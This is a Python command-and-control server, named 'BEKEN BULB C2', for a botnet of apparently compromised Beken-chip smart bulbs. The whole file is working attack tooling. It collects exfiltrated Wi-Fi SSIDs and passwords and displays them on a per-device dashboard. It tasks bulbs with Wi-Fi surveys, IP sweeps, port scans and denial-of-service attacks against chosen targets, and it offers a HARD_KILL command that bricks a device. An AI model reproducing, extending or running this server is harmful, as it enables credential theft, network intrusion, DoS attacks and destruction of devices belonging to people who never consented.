import socket
import threading
import time
import sys
from Crypto.Cipher import AES

# --- CONFIGURATION ---
KEY = b"1234567890123456" 
PORT = 8080
C2_PACKET_SIZE = 256
COMMAND_QUEUES = {} 
BULB_DATA_VAULT = {} 

# --- TYPE MAPPING (Matches C Macros Exactly) ---
# Format: "C_STRING": ("DISPLAY_NAME", "BEHAVIOR")
# Behaviors: "PARTIAL", "FINAL", "IMMEDIATE"
TYPE_MAP = {
    "hb":       ("HEARTBEAT", "IMMEDIATE"),
    "wifip":    ("WIFI_SCAN", "PARTIAL"),
    "wifif":    ("WIFI_SCAN", "FINAL"),
    "ipp":      ("IP_SCAN",   "PARTIAL"),
    "ipf":      ("IP_SCAN",   "FINAL"),
    "portp":    ("PORT_SCAN", "PARTIAL"),
    "portf":    ("PORT_SCAN", "FINAL"),
    "logp":     ("SYSTEM_LOG","PARTIAL"),
    "logf":     ("SYSTEM_LOG","FINAL"),
    "creds":    ("WIFI_CREDS", "IMMEDIATE"),
    "dos": 	    ("DOS_ATTACK", "PARTIAL")
}

# --- CRYPTO ---
def decrypt_message(data):
    try:
        cipher = AES.new(KEY, AES.MODE_ECB)
        return cipher.decrypt(data).decode('utf-8', errors='ignore').strip('\x00')
    except Exception as e:
        return f"Decryption Error: {e}"

def encrypt_message(message):
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(message.ljust(C2_PACKET_SIZE, '\x00').encode('utf-8'))

# --- CORE PROCESSING ---
def process_incoming_data(decrypted, timestamp, addr):
    try:
        # Expected: ID:001|TYPE:wifip|DATA:...
        parts = decrypted.split('|', 2)
        bulb_id = parts[0].split(':')[1]
        c_type = parts[1].split(':')[1].lower() 
        content = parts[2].split(':', 1)[1]
    except (IndexError, ValueError):
        print(f"[{timestamp}] Protocol Error: {decrypted}")
        return "UNKNOWN"

    if bulb_id not in BULB_DATA_VAULT:
        BULB_DATA_VAULT[bulb_id] = {}

    BULB_DATA_VAULT[bulb_id]["LAST_SEEN"] = time.strftime("%H:%M:%S")
    display_name, behavior = TYPE_MAP.get(c_type, (c_type.upper(), "IMMEDIATE"))

    # 1. PARTIAL BEHAVIOR (Drip-feeding the buffer)
    if behavior == "PARTIAL":
        buf_key = f"{display_name}_buffer"
        BULB_DATA_VAULT[bulb_id][buf_key] = BULB_DATA_VAULT[bulb_id].get(buf_key, "") + content
        # Still send a small log so we know it's working
        print(f"[{timestamp}] {bulb_id} -> {display_name} Drip...") 

    # 2. FINAL BEHAVIOR (Scan complete, parse and display)
    elif behavior == "FINAL":
        buf_key = f"{display_name}_buffer"
        final_payload = BULB_DATA_VAULT[bulb_id].get(buf_key, "") + content
        BULB_DATA_VAULT[bulb_id][display_name] = final_payload
        
        print(f"\n[{timestamp}] {bulb_id} -> {display_name} COMPLETE")
        
        # --- PORT SCAN FORMATTING ---
        if display_name == "PORT_SCAN":
            if "|" in final_payload:
                header, ports = final_payload.split("|", 1)
                target_ip = header.replace("TARGET:", "")
                print(f"--- Port Scan Results: {target_ip} ---")
                for p in ports.strip(";").split(";"):
                    if p: print(f"    [+] Port {p} is OPEN")
            else:
                print(f"    Raw Port Data: {final_payload}")

        # --- WIFI SCAN FORMATTING ---
        elif display_name == "WIFI_SCAN":
            print(f"{'SSID':<25} | {'BSSID':<18} | {'CH':<3} | {'RSSI':<4}")
            print("-" * 65)
            for net in final_payload.strip(";").split(";"):
                if "|" in net:
                    p = net.split("|")
                    print(f"{p[0]:<25} | {p[1]:<18} | {p[2]:<3} | {p[3]:<4}")

        # --- IP SCAN FORMATTING ---
        elif display_name == "IP_SCAN":
            print(f"--- Live Hosts Discovered ---")
            for host in final_payload.strip(";").split(";"):
                if host: print(f"    [+] {host}")
        
        BULB_DATA_VAULT[bulb_id][buf_key] = "" # Reset buffer for next scan

    # 3. IMMEDIATE BEHAVIOR (Heartbeats and basic commands)
    else:
        BULB_DATA_VAULT[bulb_id][display_name] = content
        if display_name == "WIFI_CREDS":
            BULB_DATA_VAULT[bulb_id]["LAST_STATUS"] = "CREDS_EXFILTRATED"
            # content looks like "SSID:MyNet;PASS:12345"
            parts = content.split(';')
            ssid = parts[0].split(':', 1)[1]
            password = parts[1].split(':', 1)[1]
            BULB_DATA_VAULT[bulb_id]["SSID"] = ssid
            BULB_DATA_VAULT[bulb_id]["PASSWORD"] = password
            print(f"\n[!] EXFILTRATED CREDENTIALS from {bulb_id}")
            print(f"    SSID: {ssid}")
            print(f"    PASS: {password}\n")
        elif display_name == "HEARTBEAT":
            BULB_DATA_VAULT[bulb_id]["LAST_STATUS"] = content
            # Shows: [18:05:12] 001 -> Status: SCANNING_PORTS
            print(f"[{timestamp}] {bulb_id} -> Status: {content}")
        else:
            print(f"[{timestamp}] {bulb_id} -> {display_name}: {content}")
    
    return bulb_id

# --- SERVER BOILERPLATE ---
def input_thread():
    print(f"[*] Commands: <ID> <CMD> | VIEW <ID> [TYPE]")
    sepLen = 100
    while True:
        line = sys.stdin.readline().strip()
        if not line: continue
        # --- HELP COMMAND ---
        if line.startswith("HELP") or line == "?":
            print("\n" + "="*sepLen)
            print("         BEKEN BULB C2 - COMMAND REFERENCE")
            print("="*sepLen)
            print(f"{'COMMAND':<25} | {'DESCRIPTION'}")
            print("-"*sepLen)
            print(f"{'LIST':<25} | List all connected bulbs and their status")
            print(f"{'VIEW <ID>':<25} | Show dashboard summary for a specific bulb")
            print(f"{'VIEW <ID> <TYPE>':<25} | View raw data (IP_SCAN, WIFI_SCAN, etc.)")
            print("-"*sepLen)
            print(f"{'<ID> GET_CREDS':<25} | Force bulb to resend Wi-Fi credentials on next heartbeat")
            print(f"{'<ID> IP_SCAN':<25} | Task bulb to perform an IP Ping Sweep")
            print(f"{'<ID> WIFI_SCAN':<25} | Task bulb to perform a Wi-Fi Site Survey")
            print(f"{'<ID> PORT_SCAN <IP>':<25} | Task bulb to scan ports on a target IP")
            print(f"{'<ID> DOS_ATTACK <IP> <PORT> <DURATION>':<25} | Task bulb to perform a DoS attack")
            print(f"{'<ID> STOP_SCAN':<25} | Kill current scan and reset buffer")
            print(f"{'<ID> RESTART':<25} | Reboots the bulb")
            print(f"{'<ID> HARD_KILL':<25} | BRICK DEVICE (Requires reflash to recover)")
            print("-"*sepLen)
            print(f"{'HELP':<25} | Display this menu")
            print("="*sepLen + "\n")
            continue
        # --- Updated VIEW command ---
        elif line.startswith("VIEW"):
            parts = line.split(" ")
            if len(parts) < 2:
                print("[!] Usage: VIEW <ID> [OPTIONAL_TYPE]")
                continue
                
            target_id = parts[1]
            bulb_info = BULB_DATA_VAULT.get(target_id)
            
            if not bulb_info:
                print(f"[!] No data found for bulb {target_id}")
                continue

            if len(parts) == 3:
                # VIEW [ID] [TYPE]
                req_type = parts[2].upper()
                data = bulb_info.get(req_type)
                
                if data:
                    print(f"\n--- {target_id} | {req_type} ---")
                    
                    # Specialized Formatting for Port Scans
                    if req_type == "PORT_SCAN":
                        if "|" in data:
                            header, port_list = data.split("|", 1)
                            print(f"Target Host: {header.replace('TARGET:', '')}")
                            print("Open Ports:")
                            for p in port_list.strip(";").split(";"):
                                if p: print(f"  [+] {p}")
                        else:
                            print(f"  {data}")

                    # Standard Formatting for IP/WIFI Scans
                    elif "SCAN" in req_type:
                        for entry in data.strip(";").split(";"):
                            if entry: print(f"    {entry}")
                    
                    else:
                        print(f"    {data}")
                else:
                    available = [k for k in bulb_info.keys() if not k.endswith('_buffer')]
                    print(f"[!] Type '{req_type}' not found for bulb {target_id}")
                    print(f"    Available: {', '.join(available)}")
            
            else:
                status = bulb_info.get("LAST_STATUS", "UNKNOWN")
                last_time = bulb_info.get("LAST_SEEN", "N/A")
                ssid = bulb_info.get("SSID", "N/A")
                password = bulb_info.get("PASSWORD", "N/A")
                
                print(f"\n" + "═"*50)
                print(f" DEVICE DASHBOARD: {target_id}")
                print(f"═"*50)
                print(f" Current Activity : {status}")
                print(f" Last Check-in    : {last_time}")
                print(f"─"*50)
                
                # Highlighted Credentials Section
                print(f" NETWORK ACCESS:")
                print(f"  [*] SSID     : {ssid}")
                print(f"  [*] PASSWORD : {password}")
                print(f"─"*50)
                
                print(" DISCOVERY SUMMARY:")
                for key in ["IP_SCAN", "WIFI_SCAN", "PORT_SCAN"]:
                    val = bulb_info.get(key, "")
                    if val:
                        if key == "PORT_SCAN" and "|" in val:
                            target_ip = val.split("|")[0].replace("TARGET:", "")
                            print(f"  [+] {key:<12}: Active on {target_ip}")
                        else:
                            count = len(val.strip(";").split(";"))
                            print(f"  [+] {key:<12}: {count} entries")
                    else:
                        print(f"  [ ] {key:<12}: No data")
                
                print("═"*50)
                print(f"[*] Use 'VIEW {target_id} <TYPE>' for detailed lists.")
            continue

        elif "PORT_SCAN" in line.upper():
         # Usage: 001 PORT_SCAN 10.2.1.15
            try:
                parts = line.split(" ")
                tid = parts[0]
                target_ip = parts[2]
                cmd = f"PORT_SCAN|{target_ip}"
        
                COMMAND_QUEUES.setdefault(tid, []).append(cmd)
                print(f"--- Tasked {tid} to Port Scan {target_ip} ---")
            except IndexError:
                print("[!] Usage: <ID> PORT_SCAN <TARGET_IP>")
        elif "DOS_ATTACK" in line:
            parts = line.split(" ")
            if len(parts) == 5:
                tid, _, ip, port, duration = parts
                cmd = f"DOS_ATTACK:{ip}|{port}|{duration}"
                COMMAND_QUEUES.setdefault(tid, []).append(cmd)
                print(f"--- Tasked {tid} to DoS {ip}:{port} for {duration}s")
        # --- Standard Tasking ---
        elif " " in line:
            tid, cmd = line.split(" ", 1)
            COMMAND_QUEUES.setdefault(tid, []).append(cmd)
            print(f"--- Tasked {tid}: {cmd} ---")

def start_server():
    threading.Thread(target=input_thread, daemon=True).start()
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind(('0.0.0.0', PORT))
        s.listen(5)
        print(f"[*] C2 Server Active on Port {PORT}")

        while True:
            conn, addr = s.accept()
            with conn:
                raw = conn.recv(C2_PACKET_SIZE)
                if not raw or len(raw) < C2_PACKET_SIZE: continue
                decrypted = decrypt_message(raw)
                active_id = process_incoming_data(decrypted, time.strftime("%H:%M:%S"), addr)
                
                q = COMMAND_QUEUES.get(active_id, [])
                conn.sendall(encrypt_message(q.pop(0) if q else "ACK"))

if __name__ == "__main__":
    start_server()